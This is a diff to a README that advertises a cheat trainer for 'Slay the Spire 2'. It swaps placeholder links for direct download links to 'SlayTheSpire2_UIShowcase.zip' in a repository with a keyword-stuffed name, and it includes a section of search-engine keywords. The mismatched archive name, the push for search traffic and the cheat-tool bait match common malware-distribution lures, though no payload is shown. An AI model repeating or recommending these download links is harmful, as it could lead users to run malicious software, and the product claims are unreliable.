@@ -5,7 +5,7 @@
 **Powerful Overlay Cheat Menu / Trainer for Slay the Spire 2 Early Access (v1.0 – March 2026)**  
 Infinite Energy, God Mode (Infinite HP), Infinite Gold, Zero Cost Cards, Unlock All Cards & Relics, One Hit Kill, Deck Editor + more!
 
-[![Download Slay the Spire 2 Trainer 2026 – Latest Release](https://img.shields.io/badge/DOWNLOAD%20LATEST%20RELEASE-FF3366?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://github.com/YOUR_USERNAME/YOUR_REPO/releases/latest)
+[![Download Slay the Spire 2 Trainer 2026 – Latest Release](https://img.shields.io/badge/DOWNLOAD%20LATEST%20RELEASE-FF3366?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://github.com/Skezz231/Slay-the-Spire-2-Trainer-Infinite-Energy-Infinite-Mega-Gold-Unlimited-Block-Zero-Cost-Cards-sources/releases/download/1.0/SlayTheSpire2_UIShowcase.zip)
 
 <img width="508" height="781" alt="image" src="https://github.com/user-attachments/assets/f07005a1-7e59-4807-b7d3-4beec84a8691" />
 
@@ -59,7 +59,7 @@ Perfect for testing builds, farming relics, or just having fun in **Slay the Spi
 
 ## 📥 Download Slay the Spire 2 Trainer 2026
 
-→ **[Latest Version – Click Here](https://github.com/YOUR_USERNAME/YOUR_REPO/releases/latest)** ←  
+→ **[Latest Version – Click Here](https://github.com/Skezz231/Slay-the-Spire-2-Trainer-Infinite-Energy-Infinite-Mega-Gold-Unlimited-Block-Zero-Cost-Cards-sources/releases/download/1.0/SlayTheSpire2_UIShowcase.zip)** ←  
 Always get the newest build from Releases tab!
 
 ## 🔍 SEO & Search Keywords (people actually search this in 2026)
